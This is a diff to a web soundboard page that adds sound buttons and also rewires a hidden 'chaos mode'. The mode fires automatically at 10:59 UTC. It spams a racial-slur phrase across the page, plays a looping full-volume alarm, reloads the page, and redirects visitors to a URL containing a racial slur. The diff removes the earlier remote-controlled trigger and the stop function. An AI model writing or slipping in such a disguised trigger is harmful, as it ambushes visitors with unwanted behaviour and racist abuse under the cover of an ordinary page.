@@ -65,6 +65,13 @@
     <div class="sound-button" onclick="playSound(6)">Sound 7</div>
     <div class="sound-button" onclick="playSound(7)">Sound 8</div>
     <div class="sound-button" onclick="playSound(8)">Goober Sound</div>
+    <div class="sound-button" onclick="playSound(9)">Sound 9</div>
+    <div class="sound-button" onclick="playSound(10)">Sound 10</div>
+    <div class="sound-button" onclick="playSound(11)">Sound 11</div>
+    <div class="sound-button" onclick="playSound(12)">Sound 12</div>
+    <div class="sound-button" onclick="playSound(13)">Sound 13</div>
+    <div class="sound-button" onclick="playSound(14)">Sound 14</div>
+    <div class="sound-button" onclick="playSound(15)">Sound 15</div>
   </div>
 
   <div class="controls">
@@ -73,6 +80,13 @@
   </div>
 
   <script>
+    let currentAudio = null;
+    let alarmAudio = null;
+    let chaosInterval;
+    let chaosActive = false;
+    let chaosTriggered = false;
+    let chaosRedirected = false;
+
     const sounds = [
       "sound1.mp3",
       "sound2.mp3",
@@ -80,40 +94,33 @@
       "sound4.mp3",
       "sound5.mp3",
       "youtube_kem5AfOws9Y_audio.mp3",
-      "sound 7.mp3",
-      "youtube_3gCBFKHVJVA_audio.mp3",
-      "reddit_xxx_goober_xxx_1k37csw_audio.mp3"
+      "sound7.mp3",
+      "sound8.mp3",
+      "reddit_xxx_goober_xxx_1k37csw_audio.mp3",
+      "sound9.mp3",
+      "sound10.mp3",
+      "sound11.mp3",
+      "sound12.mp3",
+      "sound13.mp3",
+      "sound13 (1).mp3",
+      "sound14.mp3",
+      "sound15.mp3"
     ];
 
     const alarmSoundSrc = "youtube_onib3bDo6Z0_audio.mp3";
     const backgroundImage = "fdc33b7f-7999-4173-97c8-377c039eb5af.png";
     const chaosWord = "im spanish now negro";
-
-    let currentAudio = null;
-    let alarmAudio = new Audio(alarmSoundSrc);
-    let chaosInterval;
-    let chaosActive = false;
-
-    alarmAudio.loop = true;
-    alarmAudio.volume = 1.0;
-
-    document.getElementById('volumeSlider').addEventListener('input', (e) => {
-      const volume = e.target.value;
-      if (currentAudio) {
-        currentAudio.volume = volume;
-      }
-    });
+    const chaosRedirectUrl = "https://wwww.wherecanibuyniggers.com"; // CHANGE THIS!
 
     function playSound(index) {
       if (currentAudio) {
         currentAudio.pause();
         currentAudio.currentTime = 0;
       }
-
       const audio = new Audio(sounds[index]);
       audio.volume = document.getElementById('volumeSlider').value;
 
-      if (index === 8) { // Special handling for Goober
+      if (index === 8) {
         audio.addEventListener('loadedmetadata', () => {
           audio.currentTime = 270;
           audio.play();
@@ -124,7 +131,6 @@
       } else {
         audio.play();
       }
-
       currentAudio = audio;
     }
 
@@ -135,8 +141,10 @@
       document.body.style.backgroundImage = `url('${backgroundImage}')`;
       document.body.style.backgroundSize = 'cover';
 
+      alarmAudio = new Audio(alarmSoundSrc);
+      alarmAudio.loop = true;
       alarmAudio.volume = 1.0;
-      alarmAudio.play().catch(err => console.log("Alarm play blocked:", err));
+      alarmAudio.play();
 
       chaosInterval = setInterval(() => {
         const span = document.createElement("span");
@@ -150,44 +158,34 @@
         span.style.opacity = 0.8;
         document.body.appendChild(span);
       }, 200);
-    }
 
-    function stopChaosMode() {
-      if (!chaosActive) return;
-      chaosActive = false;
+      if (!chaosTriggered) {
+        chaosTriggered = true;
+        setTimeout(() => {
+          location.reload();
+        }, 500);
+      }
 
-      clearInterval(chaosInterval);
-      document.body.style.backgroundImage = '';
-
-      document.querySelectorAll('span').forEach(span => span.remove());
-
-      if (alarmAudio) {
-        alarmAudio.pause();
-        alarmAudio.currentTime = 0;
+      if (!chaosRedirected) {
+        chaosRedirected = true;
+        setTimeout(() => {
+          window.location.href = chaosRedirectUrl;
+        }, 10000);
       }
     }
 
-    async function checkChaosJson() {
-      try {
-        const response = await fetch('https://raw.githubusercontent.com/wsgmypeople-cell2/random-thingy/main/chaos.json', {
-          cache: "no-store"
-        });
-        const data = await response.json();
-        if (data.chaos) {
-          startChaosMode(); // Start chaos visuals + alarm
-          setTimeout(() => {
-            window.location.href = "www.wherecanibuyniggers.com"; // 👈 PUT YOUR REDIRECT LINK HERE
-          }, 20000); // 20 seconds delay (20000 ms)
-        } else {
-          stopChaosMode();
-        }
-      } catch (err) {
-        console.error("Error fetching chaos.json:", err);
+    function checkTimeForChaos() {
+      const now = new Date();
+      const utcHours = now.getUTCHours();
+      const utcMinutes = now.getUTCMinutes();
+
+      if (utcHours === 10 && utcMinutes === 59) {
+        startChaosMode();
       }
     }
 
-    setInterval(checkChaosJson, 1000); // Check every second
-    window.onload = checkChaosJson;
+    setInterval(checkTimeForChaos, 1000);
+    window.onload = checkTimeForChaos;
   </script>
 
 </body>
